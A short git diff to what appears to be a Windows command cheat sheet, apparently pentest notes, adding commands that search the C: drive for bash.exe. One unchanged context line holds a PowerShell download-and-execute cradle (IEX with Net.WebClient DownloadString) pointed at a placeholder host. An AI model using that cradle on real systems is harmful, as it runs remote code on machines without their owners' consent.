@@ -607,6 +607,12 @@ IEX(New-Object Net.WebClient).DownloadString("http://ip/file")
 Rename-Item -Path <String> -NewName <String>
 
 Remove-Item -Path "C:\Path\To\YourFile.txt"
+
+# cmd
+where.exe /r c:\ bash.exe
+
+# powershell
+Get-ChildItem -Path C:\ -Filter bash.exe -Recurse -ErrorAction SilentlyContinue
 ```
  
 </details>
